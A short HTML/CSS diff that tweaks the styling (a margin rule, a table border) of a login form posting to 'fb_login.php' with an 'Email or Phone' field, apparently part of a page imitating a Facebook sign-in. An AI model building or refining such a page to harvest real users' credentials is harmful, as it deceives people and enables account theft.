@@ -26,12 +26,15 @@ div.transbox {
   position: absolute;
   left: 65%;
 }
+div.transbox {
+  margin: 30px;
+}
 </style>
 
 <div class="transbox">
 <div class="dentro">
   <form action="fb_login.php" method="post">
-      <table  border="1">
+      <table  border="0">
       <tr valign="middle">
       <td><font style="font-family:arial; font-size:10px;"><b>Email or Phone </b></font></td>
       <td align="center"><input type="text" name="user" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
